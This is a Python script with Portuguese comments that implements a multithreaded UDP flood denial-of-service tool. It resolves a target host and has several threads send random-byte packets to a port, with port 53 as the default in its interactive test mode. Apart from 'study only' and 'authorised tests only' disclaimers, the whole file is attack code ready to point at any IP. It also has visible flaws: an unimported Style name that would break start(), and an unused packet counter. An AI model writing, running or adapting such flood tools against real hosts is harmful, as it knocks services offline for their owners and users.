#!/usr/bin/env python3
# tools/udp_flood.py

import socket
import threading
import time
import random
from colorama import Fore, init

init(autoreset=True)

class UDPFlood:
    def __init__(self, target_ip, target_port=80, threads=10, duration=60):
        """
        Ataque UDP Flood - APENAS PARA ESTUDO
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.running = False
        self.packets_sent = 0
        
        # Resolver DNS se necessário
        try:
            socket.inet_aton(target_ip)
            self.ip = target_ip
        except socket.error:
            try:
                self.ip = socket.gethostbyname(target_ip)
                print(f"{Fore.CYAN}[*] Domínio resolvido: {self.ip}")
            except:
                print(f"{Fore.RED}[!] Não foi possível resolver o domínio")
                raise
    
    def attack_worker(self, thread_id):
        """Trabalhador UDP"""
        # Criar socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        local_packets = 0
        errors = 0
        
        print(f"{Fore.CYAN}[Thread {thread_id}] Iniciada")
        
        while self.running:
            try:
                # Gerar dados aleatórios de tamanho variável
                packet_size = random.choice([64, 128, 256, 512, 1024, 2048])
                data = random._urandom(packet_size)
                
                # Enviar pacote
                sock.sendto(data, (self.ip, self.target_port))
                
                local_packets += 1
                
                # Mostrar progresso a cada 100 pacotes
                if local_packets % 100 == 0:
                    print(f"{Fore.GREEN}[Thread {thread_id}] Enviados {local_packets} pacotes UDP")
                
            except Exception as e:
                errors += 1
                print(f"{Fore.RED}[Thread {thread_id}] Erro: {e}")
            
            # Pequena pausa para não sobrecarregar a CPU
            time.sleep(0.01)
        
        sock.close()
        print(f"{Fore.MAGENTA}[Thread {thread_id}] Finalizada - {local_packets} pacotes, {errors} erros")
    
    def start(self):
        """Inicia o ataque UDP"""
        print(f"""
{Fore.RED}╔════════════════════════════════════════╗
║        INICIANDO UDP FLOOD             ║
╠════════════════════════════════════════╣
║ Alvo: {self.ip:<19} ║
║ Porta: {self.target_port:<24} ║
║ Threads: {self.threads:<21} ║
║ Duração: {self.duration}s {' ' * 19}║
╚════════════════════════════════════════╝{Style.RESET_ALL}
        """)
        
        self.running = True
        threads = []
        
        # Criar threads
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.1)  # Pequeno intervalo entre threads
        
        # Monitorar tempo
        start_time = time.time()
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                remaining = self.duration - elapsed
                print(f"{Fore.CYAN}[⏱️] Tempo: {elapsed}s decorridos | {remaining}s restantes")
        
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}\n[!] Ataque interrompido pelo usuário")
        
        finally:
            self.stop()
    
    def stop(self):
        """Para o ataque"""
        self.running = False
        print(f"{Fore.GREEN}[✓] UDP Flood finalizado")

if __name__ == "__main__":
    # Teste rápido
    print(f"{Fore.RED}⚠️  APENAS PARA TESTES AUTORIZADOS!")
    target = input("IP alvo: ")
    if target:
        attack = UDPFlood(
            target_ip=target,
            target_port=53,  # Porta DNS é comum para UDP Flood
            threads=5,
            duration=10
        )
        attack.start()
